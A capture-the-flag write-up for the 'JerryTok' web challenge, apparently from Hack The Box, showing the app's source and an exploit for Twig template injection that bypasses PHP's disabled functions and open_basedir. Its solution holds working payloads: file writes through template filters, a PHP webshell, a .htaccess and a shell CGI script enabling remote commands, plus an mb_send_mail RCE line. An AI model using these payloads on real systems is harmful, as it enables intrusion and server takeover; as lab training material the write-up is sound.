# Web

## Description

Welcome to JerryTok, your portal to the nearest jerryboree, where mediocrity is celebrated! Dive into the daily escapades of the wonderfully average, from mundane mishaps to modest triumphs. Share your moments, connect, and laugh as you find glory in the ordinary. Join now and embrace the delightfully dull at your local jerryboree!

## Source

`entrypoint.sh`
```bash
#!/bin/ash

# Secure entrypoint
chmod 600 /entrypoint.sh

# Secure PHP Installation
mkdir -p /etc/php82/conf.d
mkdir -p /run/apache2

echo "disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create, mail" >> /etc/php82/conf.d/disablefns.ini
echo "open_basedir = /www" >> /etc/php82/conf.d/openbdir.ini

# Run supervisord
/usr/bin/supervisord -c /etc/supervisord.conf
```

`src/Controller/DefaultController.php`
```php
<?php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;

class DefaultController extends AbstractController {
    public function index(Request $request): Response {
        $location = $request->get('location');

        if (empty($location)) {
            $latitude = mt_rand(-90, 90) + mt_rand() / mt_getrandmax();
            $longitude = mt_rand(-180, 180) + mt_rand() / mt_getrandmax();
            $location = "($latitude, $longitude)";
        }

        $message = $this->container->get('twig')->createTemplate(
            "Located at: {$location} from your ship's computer"
        )->render();

        return $this->render('base.html.twig', [
            'message' => $message ?? ''
        ]);
    }
}
```

## Solution

![jerrytok.png](/assets/ctf/htb/web/jerrytok.png)

The default controller class allows us to pass parameter `location` which is later rendered as template string.

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php)

SSTI is confirmed:
```bash
└─$ curl 'http://83.136.255.40:31101/?location=\{\{7*7\}\}' -s | grep 49
        <h3 class='text-center'>Located at: 49 from your ships computer</h3>

└─$ curl 'http://83.136.255.40:31101/?location=\{\{9*9\}\}' -s | grep 81
        <h3 class='text-center'>Located at: 81 from your ships computer</h3>
```

SSTI works, but we can't use system commands because they are disabled (entrypoint.sh)

The Apache server has cgi-bin enabled.
```xml
...
LoadModule cgi_module modules/mod_cgi.so
...
<IfModule cgid_module>
    Scriptsock cgisock
</IfModule>
...
ScriptAlias /cgi-bin /usr/bin
Action php-script /cgi-bin/php-cgi
AddHandler php-script .php
...
```

[cyberlibrary.fr > disable_functions bypass - mod_cgi](https://cyberlibrary.fr/servicesprotocols-pentesting/disablefunctions-bypass-modcgi#block-925f12f27a56443b94962147a1916e93)

[ctf flask SSTI template injection payload classification list](https://blog.csdn.net/qq_37301470/article/details/121435672)

I wasn't able to get `cgi-bin` to work and most probably it's because of `"open_basedir = /www"` restriction, meaning we can't write anything outside `/www`
```python
import requests
from bs4 import BeautifulSoup as BS
import re
from base64 import b64encode as be

def get_output(payload):
    resp = requests.get(URL, params={'location': payload})
    try:
        output = BS(resp.text, 'html.parser').find('footer', id='pageFooter').find('h3').get_text(strip=True)
        output = re.search(r'at: (.*?) from', output, re.DOTALL).group(1)
    except:
        output = resp.text
    
    return output

URL = 'http://94.237.59.63:35144/'
URL = 'http://127.0.0.1:1337/'

script = '''#!/bin/bash
echo "Content-type: text/plain"
echo ""
echo "Here is a listing of /etc:"
ls /etc
'''

payload = '''
{% set data = (['SCRIPT']|map('base64_decode')|join) %}
{{{(data): 't.sh'}|map('file_put_contents')|join}}
'''.replace('SCRIPT', be(script.encode()).decode())
print(get_output(payload))
```

::: info Note
Checking the directory via Docker showed that it didn't exist? or this location was correct `/var/www/localhost/cgi-bin`, but it wouldn't update scripts.
:::

[official docs](https://httpd.apache.org/docs/2.4/howto/cgi.html) says that `ScriptAlias /cgi-bin /usr/bin` is the location of cgi binaries that can be executed, but basedir prevents that.
```xml
<Directory /usr/bin>
    Order allow,deny
    Allow from all
</Directory>
```

Most system commands are disable, by PHP has tilde just like bash which can be used to bypass the filters.
Upload the webshell:
```python
# <SNIP>
payload = '''
{{{('<?=`$_GET[0]`?>'): 'letmein.php'}|map('file_put_contents')|join}}
'''
print(get_output(payload))
```

Oddly enough this works on local instance, but not remote... wot...
```bash
# Local
└─$ py exploit.py
15
└─$ curl 'http://localhost:1337/letmein.php?0=id' -i
HTTP/1.1 200 OK
Date: Sat, 07 Sep 2024 07:21:08 GMT
Server: Apache/2.4.62 (Unix)
X-Powered-By: PHP/8.3.10
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

uid=1000(www) gid=1000(www) groups=1000(www)

# Remote
└─$ py exploit.py
15
└─$ curl 'http://94.237.59.63:35144/letmein.php?0=id' -i
HTTP/1.1 500 Internal Server Error
Date: Sat, 07 Sep 2024 07:21:20 GMT
Server: Apache/2.4.59 (Unix)
X-Powered-By: PHP/8.2.18
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

The file is definitely written, but it's not able to execute on **Remote**

Back to CGI thingy, in the docs I saw `.htaccess` tutorial

![jerrytok-1.png](/assets/ctf/htb/web/jerrytok-1.png)

_`.htaccess` files provide a way to make configuration changes on a per-directory basis._ [src](https://httpd.apache.org/docs/2.4/howto/htaccess.html)

![jerrytok-2.png](/assets/ctf/htb/web/jerrytok-2.png)

```python
import requests
from bs4 import BeautifulSoup as BS
import re
from base64 import b64encode as be

def send(payload):
    print(payload)
    print(get_output(payload))

def get_output(payload):
    resp = requests.get(URL, params={'location': payload})
    try:
        output = BS(resp.text, 'html.parser').find('footer', id='pageFooter').find('h3').get_text(strip=True)
        output = re.search(r'at: (.*?) from', output, re.DOTALL).group(1)
    except:
        output = resp.text
    
    return output

URL = 'http://94.237.59.199:39532/'
# URL = 'http://127.0.0.1:1337/'

## 1. add_cgi_handler
script = '''
Options +ExecCGI
AddHandler cgi-script cgi
'''

payload = '''
{% set data = (['SCRIPT']|map('base64_decode')|join) %}
{{{(data): '.htaccess'}|map('file_put_contents')|join}}
'''.replace('SCRIPT', be(script.encode()).decode())

send(payload)

## 2. Add cgi script
script = '''#!/bin/sh

echo "Content-type: text/plain"
echo ""

cmd="$QUERY_STRING"
if [ -n "$cmd" ]; then
    echo "$($cmd 2>&1)"
else
    echo "No command provided."
fi
'''

payload = '''
{% set data = (['SCRIPT']|map('base64_decode')|join) %}
{{ {(data): 'cmd.cgi'}|map('file_put_contents')|join }}
{{['cmd.cgi', 511]|sort('chmod')|join}}
'''.replace('SCRIPT', be(script.encode()).decode())

send(payload)
```

::: info Note
`0o777` in integer is `511` for chmod.
:::

```powershell
➜ curl 'http://94.237.59.199:39532/cmd.cgi?id'
uid=1000(www) gid=1000(www) groups=1000(www)
➜ curl 'http://94.237.59.199:39532/cmd.cgi?/readflag'
HTB{byp4ss1ng_d1s4bl3d_fuNc7i0n5_and_0p3n_b4s3d1r_c4n_b3_s0_mund4n3}
```

---

Second way is to use `mb_send_mail` for RCE 👀
```bash
{{['/www/public/backdoor.php',"<?php mb_send_mail('', '', '', '', '-H \"touch /tmp/rce\"');"]|sort('file_put_contents')}}  
```

